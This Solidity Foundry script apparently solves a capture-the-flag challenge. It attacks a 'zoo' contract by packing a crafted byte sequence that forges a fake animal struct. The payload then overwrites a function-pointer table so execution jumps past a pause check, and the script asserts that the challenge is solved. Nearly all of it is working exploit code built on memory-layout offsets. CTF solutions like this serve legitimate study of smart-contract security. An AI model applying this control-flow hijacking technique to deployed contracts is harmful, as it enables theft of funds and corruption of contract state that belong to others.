pragma solidity ^0.8.25;

import {Script, console2} from "forge-std/Script.sol";

interface Setup {
    function zoo() external view returns (address);
    function isSolved() external view returns (bool);
}

contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        console2.log("setup", address(setup));
        address zoo = setup.zoo();
        console2.log("zoo", address(zoo));

        // ADD(1) | IDX(1) | NAME_LENGTH(2) | TYPE(2) | NAME(NAME_LENGTH)
        // EDIT(1) | IDX(1) | EDIT_TYPE(1) | NAME_LENGTH(2) | NAME(NAME_LENGTH)
        // EDIT{1) | IDX(1) | EDIT_TYPE(1) | NEW_TYPE(2)
        // DEL(1) | IDX(1)

        // function pointer: 0x80 ( 0x312 )
        // local animal : 0x300
        // first animal: 0x320
        // first alloc : 0x420
        // fake_animal : 0x460
        // 0x323 : over pause

        uint256 target_idx = uint256(int256(-1)) - uint256(keccak256(abi.encode(2)));
        uint16 target_jmp = 0x323;
        uint16 function_table = 0x80;
        uint16 first_alloc = 0x400;
        uint16 local_animal = 0x300;
        uint16 fake_animal_idx = 0x460;
        target_idx /= 2;
        target_idx += 1;

        bytes memory call = "";
        bytes memory fake_animal = abi.encodePacked(uint256(target_idx), uint256(0x20), hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x00),uint16(fake_animal.length),uint16(first_alloc), fake_animal);
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(function_table));
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(target_jmp));
        call = abi.encodePacked(call, uint8(0x20),uint8(0x06),uint8(0x22), uint16(local_animal));
        call = abi.encodePacked(call, hex"3000");
        call = abi.encodePacked(call, uint8(0x20),uint8(0x07),uint8(0x22), uint16(fake_animal_idx));
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");
        call = abi.encodePacked(call, uint8(0x10),uint8(0x01),uint16(4),uint16(0x00),hex"41414141");

        uint256 length = call.length;
        console2.log("length", length);
        uint256 target = 0x200 - length;
        for (uint i = 0; i < target; i++) {
            call = abi.encodePacked(call, hex"ba");
        }
        (bool success, bytes memory out) = address(zoo).call(call);
        console2.log("solved?", setup.isSolved());
        assert(setup.isSolved());
        vm.stopBroadcast();
    }
}
